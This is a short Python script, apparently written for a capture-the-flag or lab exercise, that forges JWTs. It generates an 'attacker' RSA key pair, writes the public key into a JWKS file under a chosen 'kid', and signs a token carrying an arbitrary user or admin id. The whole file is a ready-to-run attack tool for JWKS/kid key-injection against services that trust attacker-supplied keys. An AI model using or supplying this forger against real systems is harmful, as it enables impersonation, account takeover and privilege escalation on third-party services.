import json, jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm

KID = "attacker-key"                       # any value; must match the token header

priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
open("attacker_priv.pem", "wb").write(priv.private_bytes(
    serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption()))

jwk = json.loads(RSAAlgorithm.to_jwk(priv.public_key()))
jwk.update({"kid": KID, "use": "sig", "alg": "RS256"})
json.dump({"keys": [jwk]}, open("jwks.json", "w"), indent=2)

# if use VS code
# After changing click save for correct generating or reopen file 
payload = {"user_id":"5ae31477-a78b-4de5-98cc-256bd1287f2b"}   # <-- Your id / Admin id 
token = jwt.encode(payload, open("attacker_priv.pem", "rb").read(),
                   algorithm="RS256", headers={"kid": KID})
print(token)
print(payload)